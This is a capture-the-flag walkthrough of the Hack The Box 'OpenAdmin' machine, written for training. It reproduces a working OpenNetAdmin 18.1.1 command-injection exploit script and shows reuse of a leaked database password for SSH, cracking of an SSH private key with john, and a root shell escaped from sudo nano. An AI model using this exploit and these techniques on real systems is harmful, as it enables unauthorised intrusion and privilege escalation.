---
layout: post
title:  OpenAdmin
categories: hackthebox
tags: [hackthebox, linux, easy, OpenNetAdmin, john, ssh, nano, gtfobins]
lang: "en"
image:
    path: assets/images/hackthebox/openadmin/preview.webp
    width: 300
    height: 300
---

![OpenAdmin](../../../../assets/images/hackthebox/openadmin/openadmin.jpg)

## abstract
OpenAdmin is an easy box made by <script src="https://www.hackthebox.eu/badge/82600"></script> 

The box contains an [OpenNetAdmin](https://opennetadmin.com/){:target="_blank"} web application and a website that is bind to localhost.

## enumeration

### nmap
```bash
# Nmap 7.80 scan initiated Sat Jan 18 13:27:56 2020 as: nmap -sC -sT -sV -o openadmin.nmap 10.10.10.171
Nmap scan report for openadmin.htb (10.10.10.171)
Host is up (0.030s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 18 13:28:06 2020 -- 1 IP address (1 host up) scanned in 10.17 seconds
```

There is only ssh and an apache webserver.

### Website
![openadmin.htb](../../../../assets/images/hackthebox/openadmin/0_openadmin.png)

The default apache website, maybe gobuster can find something.

### Gobuster
```bash
kali@kali:~$ gobuster dir -u http://openadmin.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://openadmin.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/01/18 13:30:39 Starting gobuster
===============================================================
/music (Status: 301)
/artwork (Status: 301)
/sierra (Status: 301)
/server-status (Status: 403)
===============================================================
2020/01/18 13:46:35 Finished
===============================================================
```

Seems that there are three different websites hosted on the server.

### Sierra
![Sierra](../../../../assets/images/hackthebox/openadmin/4_openadmin_sierra.png)

Nothing interesting found.

### Artwork
![Artwork](../../../../assets/images/hackthebox/openadmin/3_openadmin_artwork.png)

Nothing interesting found, too.

### Music
![Music](../../../../assets/images/hackthebox/openadmin/1_openadmin_music.png)

Nice, a link to a login page.

### OpenNetAdmin
![OpenNetAdmin](../../../../assets/images/hackthebox/openadmin/2_openadmin_ona.png)

This doesn't looks like a normale login page and it seems to be not the latest version of opennetadmin.

### searchsploit
So let's try to find something vulnerable.

```bash
kali@kali:~$ searchsploit opennetadmin 
----------------------------------------------------------------- -------------------------------
 Exploit Title                                                   |  Path
                                                                 | (/usr/share/exploitdb/)
----------------------------------------------------------------- -------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                    | exploits/php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)     | exploits/php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                      | exploits/php/webapps/47691.sh
----------------------------------------------------------------- -------------------------------

kali@kali:~$ searchsploit -m 47691
  Exploit: OpenNetAdmin 18.1.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47691
     Path: /usr/share/exploitdb/exploits/php/webapps/47691.sh
File Type: ASCII text, with CRLF line terminators

Copied to: /home/kali/47691.sh
```
Version 18.1.1 is vulnerable to remote code execution.

## exploitation

### Remote Code Execution
```bash
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

At first we need to convert the linebreaks to unix and then we simply execute the script to the vulnerable url.
```bash
kali@kali:~$ dos2unix 47691
dos2unix: converting file 47691.sh to Unix format...

kali@kali:~$ ./47691.sh http://openadmin.htb/ona/
$ whoami
www-data
$ ls /home
jimmy
joanna
$ ls -la local/config
total 16
drwxrwxr-x 2 www-data www-data 4096 Nov 21 16:51 .
drwxrwxr-x 5 www-data www-data 4096 Jan  3  2018 ..
-rw-r--r-- 1 www-data www-data  426 Nov 21 16:51 database_settings.inc.php
-rw-rw-r-- 1 www-data www-data 1201 Jan  3  2018 motd.txt.example
-rw-r--r-- 1 www-data www-data    0 Nov 21 16:28 run_installer
```

Hurray, a simple shell, but a shell. 

```bash
$ cat local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

A lot of users use their password more than one time. So we have two users jimmy and joana and one password.
The first step is to simply try a combination on the ssh server.

```bash
kali@kali:~$ ssh jimmy@openadmin.htb
jimmy@openadmin.htb\'s password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat May  2 13:00:36 UTC 2020

  System load:  0.0               Processes:             114
  Usage of /:   49.5% of 7.81GB   Users logged in:       1
  Memory usage: 20%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat May  2 12:58:12 2020 from 10.10.14.14
jimmy@openadmin:~$ 
```

Lucky, a valid login.

```bash
jimmy@openadmin:~$ ls -la
total 32
drwxr-x--- 5 jimmy jimmy 4096 Nov 22 23:15 .
drwxr-xr-x 4 root  root  4096 Nov 22 18:00 ..
lrwxrwxrwx 1 jimmy jimmy    9 Nov 21 14:07 .bash_history -> /dev/null
-rw-r--r-- 1 jimmy jimmy  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jimmy jimmy 3771 Apr  4  2018 .bashrc
drwx------ 2 jimmy jimmy 4096 Nov 21 13:52 .cache
drwx------ 3 jimmy jimmy 4096 Nov 21 13:52 .gnupg
drwxrwxr-x 3 jimmy jimmy 4096 Nov 22 23:15 .local
-rw-r--r-- 1 jimmy jimmy  807 Apr  4  2018 .profile
jimmy@openadmin:~$ ls -l /var/www/
total 8
drwxr-xr-x 6 www-data www-data 4096 Nov 22 15:59 html
drwxrwx--- 2 jimmy    internal 4096 Nov 23 17:43 internal
lrwxrwxrwx 1 www-data www-data   12 Nov 21 16:07 ona -> /opt/ona/www
```
Unfortunately no user flag. This means we need to own joanna. In the web directory is a folder called _internal_.

```php
jimmy@openadmin:/var/www/internal$ cat main.php 
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Try to call it from the terminal.

```bash
jimmy@openadmin:/var/www/internal$ curl localhost/internal/main.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at localhost Port 80</address>
</body></html>
```

Seems that the website is not available on the webserver. Let's take a look into the apache configs.

```bash
jimmy@openadmin:/etc/apache2/sites-enabled$ cat internal.conf 
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

The configuration is for a local bind on port 52846. 
The _index.php_ file shows a hash that could be cracked, but it's easier to disable password authentication if we already have write access to the files.

So I decided to disable the password auth.
![Login manipulation](../../../../assets/images/hackthebox/openadmin/5_openadmin_php.png)

I could use curl to interact with the website, login, take the PHPSESSID cookie and send it to the main.php. But in this case I decided to use a ssh tunnel.
```bash
kali@kali:~$ ssh -L 52846:localhost:52846 jimmy@openadmin.htb
jimmy@openadmin.htb's password:
```

![Login](../../../../assets/images/hackthebox/openadmin/6_openadmin_tunnel.png)
Username: jimmy and the password does not matter. 
![Got Key](../../../../assets/images/hackthebox/openadmin/7_openadmin_ssh_key.png)

Hurray, that's the ssh key of joanna, but it's password protected. Hopefully john can help.

At first, I need to convert the key in a john compatible hash format and than try to crack it with the rockyou list.
```bash
kali@kali:~$ /usr/share/john/ssh2john.py sshkey > sshkey.hash
kali@kali:~$ sudo john -wordlist=/usr/share/wordlists/rockyou.txt sshkey.hash
[sudo] password for kali: 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (sshkey)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:03 DONE (2020-05-02 09:30) 0.3021g/s 4332Kp/s 4332Kc/s 4332KC/sa6_123..*7¡Vamos!
Session completed
```

Nice. Now change the file permissions of the sshkey and try out the bloodninjas password.

## userflag
```bash
kali@kali:~$ chmod 600 sshkey
kali@kali:~$ ssh -i sshkey joanna@openadmin.htb
Enter passphrase for key 'sshkey': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat May  2 13:44:53 UTC 2020

  System load:  0.0               Processes:             116
  Usage of /:   49.8% of 7.81GB   Users logged in:       1
  Memory usage: 20%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
joanna@openadmin:~$ wc user.txt 
 1  1 33 user.txt
```

Got user flag.

## privilege escalation
Normally I would use LinEnum or LinPeas to find a way to privesc, but the first thing I try is to list sudo.

```bash
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

If I open the file priv in directory opt with /bin/nano I execute nano with root permissions, so let's take a look at [GTFOBins](https://gtfobins.github.io/gtfobins/nano/){:target="_blank"}.

Like in vi, it's possible to execute commands inside nano.

The only things we need are two shortcuts:

ctrl + r and then ctrl + x

![nano](../../../../assets/images/hackthebox/openadmin/8_openadmin_nano.png)

The command I want to use: 
```bash
reset; sh 1>&0 2>&0
```
![root](../../../../assets/images/hackthebox/openadmin/9_openadmin_root.png)

That's it, the root flag.